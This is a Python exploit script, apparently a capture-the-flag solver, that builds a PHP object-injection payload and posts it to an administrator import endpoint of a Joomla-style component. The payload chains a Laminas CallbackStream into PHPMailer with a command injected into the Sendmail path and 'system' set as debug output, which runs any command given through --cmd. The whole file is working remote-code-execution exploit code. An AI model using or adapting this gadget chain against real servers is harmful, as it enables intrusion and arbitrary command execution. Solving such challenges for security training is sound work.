#!/usr/bin/env python3

import argparse
from urllib.parse import urljoin

import requests


DEFAULT_BASE = "http://127.0.0.1:1337"
DEFAULT_CMD = "/readflag"
IMPORT_PATH = "/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import"


def php_string(value: str) -> bytes:
    raw = value.encode()
    return b's:%d:"%s";' % (len(raw), raw)


def php_int(value: int) -> bytes:
    return b"i:%d;" % value


def php_bool(value: bool) -> bytes:
    return b"b:%d;" % (1 if value else 0)


def php_key(value) -> bytes:
    if isinstance(value, int):
        return php_int(value)
    return php_string(value)


def php_array(items) -> bytes:
    body = b"".join(php_key(key) + php_value(value) for key, value in items)
    return b"a:%d:{%s}" % (len(items), body)


def php_object(class_name: str, properties) -> bytes:
    body = b"".join(php_string(name) + php_value(value) for name, value in properties)
    return b'O:%d:"%s":%d:{%s}' % (
        len(class_name.encode()),
        class_name.encode(),
        len(properties),
        body,
    )


def php_value(value) -> bytes:
    if isinstance(value, bytes):
        return value
    if isinstance(value, bool):
        return php_bool(value)
    if isinstance(value, int):
        return php_int(value)
    if isinstance(value, str):
        return php_string(value)
    if isinstance(value, list):
        return php_array(value)
    raise TypeError(f"Unsupported PHP value: {type(value).__name__}")


def protected(name: str) -> str:
    return f"\x00*\x00{name}"


def build_rce_payload(command: str) -> bytes:
    mailer = php_object("PHPMailer\\PHPMailer\\PHPMailer", [
        ("Mailer", "sendmail"),
        ("Sendmail", f"\n{command}\n"),
        ("UseSendmailOptions", True),
        ("From", "attacker@example.com"),
        ("FromName", "Attacker"),
        ("Sender", ""),
        ("Subject", "x"),
        ("Body", "x"),
        ("AltBody", ""),
        ("CharSet", "iso-8859-1"),
        ("ContentType", "text/plain"),
        ("Encoding", "8bit"),
        ("SMTPDebug", 4),
        ("Debugoutput", "system"),
        (protected("to"), php_array([
            (0, php_array([
                (0, "victim@example.com"),
                (1, "Victim"),
            ])),
        ])),
        (protected("cc"), php_array([])),
        (protected("bcc"), php_array([])),
        (protected("ReplyTo"), php_array([])),
        (protected("all_recipients"), php_array([
            ("victim@example.com", True),
        ])),
        (protected("RecipientsQueue"), php_array([])),
        (protected("ReplyToQueue"), php_array([])),
        (protected("exceptions"), False),
        (protected("attachment"), php_array([])),
        (protected("CustomHeader"), php_array([])),
        (protected("MIMEHeader"), ""),
        (protected("MIMEBody"), ""),
        (protected("mailHeader"), ""),
    ])

    stream = php_object("Laminas\\Diactoros\\CallbackStream", [
        (protected("callback"), php_array([
            (0, mailer),
            (1, "send"),
        ])),
    ])

    return php_array([
        (0, php_array([
            ("month", stream),
            ("packages", 1),
        ])),
    ])


def main() -> None:
    parser = argparse.ArgumentParser(description="Provisioned RCE solver")
    parser.add_argument("base", nargs="?", default=DEFAULT_BASE)
    parser.add_argument("--cmd", default=DEFAULT_CMD)
    args = parser.parse_args()

    payload = build_rce_payload(args.cmd)
    target = urljoin(args.base.rstrip("/") + "/", IMPORT_PATH.lstrip("/"))
    response = requests.post(target, data={"ledger": payload}, timeout=15)
    print(f"[+] sent payload ({len(payload)} bytes), status={response.status_code}")
    print(response.text)


if __name__ == "__main__":
    main()
